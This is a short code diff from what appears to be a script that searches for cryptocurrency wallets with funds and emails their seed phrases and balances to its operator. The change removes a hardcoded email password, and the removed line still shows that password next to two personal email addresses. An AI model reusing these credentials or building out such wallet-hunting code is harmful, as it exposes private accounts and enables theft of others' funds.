@@ -63,7 +63,7 @@ def find_wallet_with_funds():
 def send_email_notification(seed_phrase, balance):
     sender_email = "nerdgod21@gmail.com"  # Your email
     receiver_email = "dylieberman@gmail.com"  # Receiver email (can be your own)
-    password = "4269Ddp!"  # Your email password or app password
+    password = ""  # Your email password or app password
 
     # Create the email content
     msg = MIMEMultipart()
